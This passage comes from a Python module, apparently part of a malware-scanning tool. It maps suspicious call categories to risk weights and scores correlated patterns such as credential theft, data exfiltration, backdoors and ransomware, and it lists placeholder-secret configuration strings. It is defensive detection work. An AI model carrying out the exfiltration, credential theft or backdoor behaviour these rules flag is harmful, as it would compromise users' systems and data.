    "KEY = 'changeme'",
    "TOKEN = 'test'",
}


# ============================================================================
# UTILITY DICTIONARIES FOR MAPPING
# ============================================================================

# Map all calls to their categories for easy lookup
ALL_BEHAVIOR_CALLS = {
    'network': NETWORK_CALLS,
    'network_receive': NETWORK_RECEIVE_CALLS,
    'process': PROCESS_CALLS,
    'file_read': FILE_READ_CALLS,
    'file_write': FILE_WRITE_CALLS,
    'file_delete': FILE_DELETE_CALLS,
    'eval_exec': EVAL_EXEC_CALLS,
    'obfuscation': OBFUSCATION_CALLS,
    'recon': RECON_CALLS,
    'persistence': PERSISTENCE_CALLS,
    'credential_access': CREDENTIAL_ACCESS_CALLS,
    'ransomware': RANSOMWARE_CALLS,
    'anti_forensics': ANTI_FORENSICS_CALLS,
    'data_exfiltration': DATA_EXFILTRATION_CALLS,
    'logic_bomb': LOGIC_BOMB_PATTERNS,
    'backdoor': BACKDOOR_INDICATORS,
    'risky_dependencies': RISKY_DEPENDENCIES,
    'insecure_config': INSECURE_CONFIG_PATTERNS,
}


# Risk weights for each category (for threat scoring)
CATEGORY_WEIGHTS = {
    'network': 20,
    'network_receive': 15,
    'process': 25,
    'file_read': 10,
    'file_write': 10,
    'file_delete': 15,
    'eval_exec': 25,
    'obfuscation': 15,
    'recon': 10,
    'persistence': 20,
    'credential_access': 30,
    'ransomware': 40,
    'anti_forensics': 25,
    'data_exfiltration': 35,
    'logic_bomb': 35,
    'backdoor': 30,
    'risky_dependencies': 15,
    'insecure_config': 15,
}


# Correlation patterns for bonus scoring
CORRELATION_PATTERNS = {
    'exfiltration': {
        'description': 'Data exfiltration pattern',
        'required': ['file_read', 'obfuscation', 'network'],
        'bonus': 40,
    },
    'ransomware': {
        'description': 'Ransomware pattern',
        'required': ['file_read', 'file_write', 'ransomware'],
        'bonus': 45,
    },
    'persistence': {
        'description': 'Persistence establishment',
        'required': ['file_write', 'persistence'],
        'bonus': 20,
    },
    'credential_theft': {
        'description': 'Credential theft pattern',
        'required': ['credential_access', 'network'],
        'bonus': 35,
    },
    'backdoor': {
        'description': 'Backdoor pattern',
        'required': ['network', 'process', 'eval_exec'],
        'bonus': 35,
    },
    'reconnaissance': {
        'description': 'Reconnaissance pattern',
        'required': ['recon', 'network'],
        'bonus': 15,
    },
    'anti_forensics': {
        'description': 'Anti-forensics pattern',
        'required': ['file_delete', 'anti_forensics'],
        'bonus': 25,
    },
    'logic_bomb': {
        'description': 'Logic bomb pattern',
        'required': ['logic_bomb', 'eval_exec'],
        'bonus': 30,
    },
}


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def get_call_category(call_name):
    """
    Get the category of a given function call.
    
    Args:
        call_name (str): Fully qualified function name
        
    Returns:
        str: Category name or None if not found
    """
    for category, calls in ALL_BEHAVIOR_CALLS.items():
        if call_name in calls:
            return category
    return None


def get_category_weight(category):
    """
    Get the weight for a given category.
    
    Args:
        category (str): Category name
        
    Returns:
        int: Weight value or 0 if not found
    """
    return CATEGORY_WEIGHTS.get(category, 0)


def is_suspicious_call(call_name):
    """
    Check if a function call is in any suspicious category.
    
    Args:
        call_name (str): Fully qualified function name
        
    Returns:
        bool: True if suspicious, False otherwise
    """
    return get_call_category(call_name) is not None


def get_correlation_bonus(detected_categories):
    """
    Calculate correlation bonuses based on detected categories.
    
    Args:
        detected_categories (list): List of detected category names
        
    Returns:
        int: Total bonus score
    """
    total_bonus = 0
    detected_set = set(detected_categories)
    
    for pattern_name, pattern in CORRELATION_PATTERNS.items():
        required_set = set(pattern['required'])
        if required_set.issubset(detected_set):
            total_bonus += pattern['bonus']
    
    return total_bonus


def get_category_description(category):
    """
    Get a human-readable description for a category.
    
    Args:
        category (str): Category name
        
    Returns:
        str: Description of the category
    """
    descriptions = {
        'network': 'Outbound network communication',
        'network_receive': 'Inbound network reception',
        'process': 'Process creation and execution',
        'file_read': 'File system read operations',
        'file_write': 'File system write operations',
        'file_delete': 'File system deletion operations',
        'eval_exec': 'Dynamic code execution',
        'obfuscation': 'Code obfuscation techniques',
        'recon': 'System reconnaissance',
        'persistence': 'Persistence mechanisms',
        'credential_access': 'Credential theft',
        'ransomware': 'Ransomware indicators',
        'anti_forensics': 'Anti-forensic techniques',
        'data_exfiltration': 'Data exfiltration',
        'logic_bomb': 'Logic bomb patterns',
        'backdoor': 'Backdoor indicators',
        'risky_dependencies': 'Risky dependencies',
        'insecure_config': 'Insecure configuration patterns',
    }
    return descriptions.get(category, 'Unknown category')


# Export all mappings and utilities
__all__ = [
    # Mappings
    'NETWORK_CALLS',
    'NETWORK_RECEIVE_CALLS',
    'PROCESS_CALLS',
    'FILE_READ_CALLS',
    'FILE_WRITE_CALLS',
    'FILE_DELETE_CALLS',
    'EVAL_EXEC_CALLS',
    'OBFUSCATION_CALLS',
    'RECON_CALLS',
    'PERSISTENCE_CALLS',
    'CREDENTIAL_ACCESS_CALLS',
    'RANSOMWARE_CALLS',
    'ANTI_FORENSICS_CALLS',
    'DATA_EXFILTRATION_CALLS',
    'LOGIC_BOMB_PATTERNS',
    'BACKDOOR_INDICATORS',
    'RISKY_DEPENDENCIES',
    'INSECURE_CONFIG_PATTERNS',
    
    # Utilities
    'ALL_BEHAVIOR_CALLS',
    'CATEGORY_WEIGHTS',
    'CORRELATION_PATTERNS',
    
    # Functions
    'get_call_category',
    'get_category_weight',
    'is_suspicious_call',
    'get_correlation_bonus',
    'get_category_description',
]